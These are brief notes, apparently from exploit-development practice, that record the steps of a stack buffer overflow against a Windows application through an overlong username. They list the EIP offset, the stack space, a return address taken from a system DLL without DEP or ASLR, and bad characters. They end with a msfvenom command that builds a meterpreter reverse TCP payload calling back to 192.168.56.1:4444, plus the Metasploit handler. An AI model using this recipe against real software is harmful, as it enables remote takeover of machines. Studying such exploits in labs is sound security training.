Steps 
======================
1) Verified that huge username crashes it
	* crashes whole application, not just thread!
2) Found offset at 2005
	* Confirmed by sending "A"*2004 + "BBBB" + "C"*500 
	* Current offset is at 2009....investigate : //TODO
3) Have 480 bytes at [esp]
	* Confirmed by examining the stack 
4) Disallowed bytes 
	* 
5) Overwrite EIP with <ret = "\x68\x97\xe7\x7c">, system dll with no DEP/ASLR
	* All application ones had \x00 in the address :( *
	* Can just reliably to \xCC instructions after EIP 
6) Got shell :)
	* msfvenom -payload windows/meterpreter_reverse_tcp LHOST=192.168.56.1 LPORT=4444 EXITFUNC=thread -f python -b "\x0d\x0a\x00\xf1"
	* user exploit/multi/handler .....
